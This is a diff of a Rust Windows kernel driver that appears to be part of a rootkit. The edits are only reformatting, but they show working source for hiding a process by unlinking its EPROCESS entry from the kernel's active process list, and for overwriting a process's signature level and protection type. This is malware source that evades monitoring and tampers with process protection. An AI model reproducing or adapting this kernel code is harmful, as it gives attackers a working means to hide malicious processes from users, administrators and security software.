@@ -1,8 +1,7 @@
-use wdk_sys::*;
 use wdk_sys::ntddk::{
-    ObfDereferenceObject, PsLookupProcessByProcessId, 
-    ZwClose, ZwOpenProcess, ZwTerminateProcess,
+    ObfDereferenceObject, PsLookupProcessByProcessId, ZwClose, ZwOpenProcess, ZwTerminateProcess,
 };
+use wdk_sys::*;
 
 use {
     alloc::vec::Vec,
@@ -10,13 +9,12 @@ use {
     spin::{Lazy, Mutex},
 };
 
-use crate::{PROCESS_SIGNATURE, Result};
 use crate::error::ShadowError;
 use crate::lock::with_push_lock_exclusive;
 use crate::offsets::{
-    get_active_process_link_offset, get_process_lock, 
-    get_signature_offset, get_token_offset,
+    get_active_process_link_offset, get_process_lock, get_signature_offset, get_token_offset,
 };
+use crate::{PROCESS_SIGNATURE, Result};
 
 // Max Number PIDs
 const MAX_PID: usize = 100;
@@ -64,7 +62,10 @@ impl Process {
         if NT_SUCCESS(status) {
             Ok(Self { e_process: process })
         } else {
-            Err(ShadowError::ApiCallFailed("PsLookupProcessByProcessId", status))
+            Err(ShadowError::ApiCallFailed(
+                "PsLookupProcessByProcessId",
+                status,
+            ))
         }
     }
 }
@@ -112,7 +113,11 @@ impl Process {
 
         // Retrieve the EPROCESS structure for the target process
         let process = Self::new(pid)?;
-        log::info!("Found EPROCESS for PID {} at address: {:p}", pid, process.e_process);
+        log::info!(
+            "Found EPROCESS for PID {} at address: {:p}",
+            pid,
+            process.e_process
+        );
 
         // Retrieve the `LIST_ENTRY` for the active process link.
         let current = process.e_process.cast::<u8>().offset(active_process_link) as PLIST_ENTRY;
@@ -125,49 +130,56 @@ impl Process {
         // Use synchronization to ensure thread safety while modifying the list.
         with_push_lock_exclusive(push_lock, || {
             log::info!("Acquired exclusive push lock for process hiding");
-        
+
             // The next process in the chain
             let next = (*current).Flink;
             // The previous process in the chain
             let previous = (*current).Blink;
-        
+
             log::info!(
                 "Before unlink: current->Flink = {:p}, current->Blink = {:p}",
-                (*current).Flink, (*current).Blink
+                (*current).Flink,
+                (*current).Blink
             );
-            log::info!("Neighboring entries: next = {:p}, previous = {:p}", next, previous);
-        
+            log::info!(
+                "Neighboring entries: next = {:p}, previous = {:p}",
+                next,
+                previous
+            );
+
             // Check if the neighboring pointers are valid before proceeding
             if next.is_null() || previous.is_null() {
-                log::error!("One or both of the neighboring pointers are null. Aborting unlink operation.");
+                log::error!(
+                    "One or both of the neighboring pointers are null. Aborting unlink operation."
+                );
                 return Err(ShadowError::InvalidListEntry);
             }
-        
+
             // Storing the previous list entry, which will be returned
             let previous_link = LIST_ENTRY {
                 Flink: next as *mut LIST_ENTRY,
                 Blink: previous as *mut LIST_ENTRY,
             };
-        
+
             // Unlink the process from the active list
             (*next).Blink = previous;
             (*previous).Flink = next;
             log::info!("Unlinked process from active process list");
-        
+
             // Make the current list entry point to itself to hide the process
             (*current).Flink = current;
             (*current).Blink = current;
             log::info!("Process LIST_ENTRY modified to point to itself");
-        
+
             // Log final state of the current entry
             log::info!(
                 "Final state of current LIST_ENTRY: Flink = {:p}, Blink = {:p}",
-                (*current).Flink, (*current).Blink
+                (*current).Flink,
+                (*current).Blink
             );
-        
+
             Ok(previous_link)
         })
-        
     }
 
     /// Unhides a process by restoring it to the active process list in the operating system.
@@ -290,7 +302,8 @@ impl Process {
 
         // Create the new protection signature value by combining the signature level and protection type
         let new_sign = (sg << 4) | tp;
-        let process_signature = process.e_process.cast::<u8>().offset(offset) as *mut PROCESS_SIGNATURE;
+        let process_signature =
+            process.e_process.cast::<u8>().offset(offset) as *mut PROCESS_SIGNATURE;
 
         // Modify the signature level and protection type of the target process
         (*process_signature).SignatureLevel = new_sign as u8;
